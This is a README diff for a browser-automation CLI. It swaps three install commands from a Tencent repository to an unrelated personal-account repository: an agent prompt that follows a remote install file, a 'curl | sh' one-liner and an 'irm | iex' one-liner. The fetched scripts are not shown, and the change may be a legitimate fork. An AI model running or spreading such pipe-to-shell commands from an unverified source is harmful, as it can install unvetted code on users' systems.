@@ -60,7 +60,7 @@ copy this one line and send it to your agent — it will install the CLI and ski
 for you, then walk you through loading the extension:
 
 ```text
-Set up browser-skill on this machine by following https://raw.githubusercontent.com/Tencent/BrowserSkill/main/AGENT_INSTALL.md
+Set up browser-skill on this machine by following https://raw.githubusercontent.com/916938/browserskill-new/main/AGENT_INSTALL.md
 ```
 
 </details>
@@ -77,13 +77,13 @@ Install the CLI, then install the extension from the [Chrome Web Store](https://
 **macOS / Linux** (recommended — installs to `~/.local/bin`):
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Tencent/BrowserSkill/main/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/916938/browserskill-new/main/install.sh | sh
 ```
 
 **Windows** (PowerShell — installs to `~/.local/bin`):
 
 ```powershell
-irm https://raw.githubusercontent.com/Tencent/BrowserSkill/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/916938/browserskill-new/main/install.ps1 | iex
 ```
 
 Verify the binary:
